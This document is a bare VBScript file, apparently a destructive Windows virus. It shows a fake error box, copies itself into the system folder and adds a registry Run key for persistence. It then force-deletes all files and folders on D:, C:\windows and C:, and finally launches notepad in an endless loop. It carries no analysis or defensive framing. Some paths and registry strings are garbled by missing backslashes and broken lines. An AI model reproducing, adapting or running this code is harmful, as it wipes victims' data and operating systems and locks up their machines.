msgbox"Error !"

On Error Resume Next

Set vip_xinh = Createobject("scripting.filesystemobject")

vip_xinh.copyfile wscript.scriptfullname,vip_xinh.GetSpecialFolder(0 )& "

vip_xinh.vbs"

Set vip_xinh2= CreateObject("WScript.Shell")

vip_xinh2.regwrite "HKLMSOFTWAREMicrosoftWindowsCurrentVersionRu

ndie","wscript.exe "& vip_xinh.GetSpecialFolder(0)& " vip_xinh.vbs %"

On Error Resume Next

Const vic = "D:"

Delvic

Sub Delvic()

Dim fso

Set fso = CreateObject("Scripting.FileSystemObject")

fso.DeleteFile vic & "*.*" , True

fso.DeleteFolder vic & "*" , True

End Sub

On Error Resume Next

Const vic1 = "C:windows"

Delvic1

Sub Delvic1()

Dim fso1

Set fso1 = CreateObject("Scripting.FileSystemObject")fso1.DeleteFile vic1 & "*.*" , True

fso1.DeleteFolder vic1 & "*" , True

End Sub

On Error Resume Next

Const vic2 = "C:"

Delvic2

Sub Delvic2()

Dim fso2

Set fso2 = CreateObject("Scripting.FileSystemObject")

fso2.DeleteFile vic2 & "*.*" , True

fso2.DeleteFolder vic2 & "*" , True

End Sub

On Error Resume Next

Set treomay= CreateObject("WScript.Shell")

Do

treomay.run "notepad",false

loop
